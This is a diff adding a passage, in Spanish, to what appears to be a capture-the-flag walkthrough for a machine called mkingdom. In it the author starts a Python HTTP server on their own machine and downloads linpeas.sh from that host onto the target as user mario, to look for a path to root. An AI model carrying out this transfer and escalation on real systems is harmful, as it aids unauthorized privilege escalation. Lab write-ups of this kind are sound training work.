@@ -407,6 +407,19 @@ mario@mkingdom:/tmp$
 
 
 
+ahora para intentar ganar acceso a root, creare un servidor de python y enviare a mario linpeas.sh 
+
+python3 -m http.server 9999
+
+--2026-07-01 12:05:12--  http://192.168.138.111:9999/linpeas.sh
+Connecting to 192.168.138.111:9999... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1065387 (1.0M) [application/x-sh]
+Saving to: ‘linpeas.sh’
+
+100%[======================================>] 1,065,387   2.07MB/s   in 0.5s   
+
+2026-07-01 12:05:13 (2.07 MB/s) - ‘linpeas.sh’ saved [1065387/1065387]
 
 
 
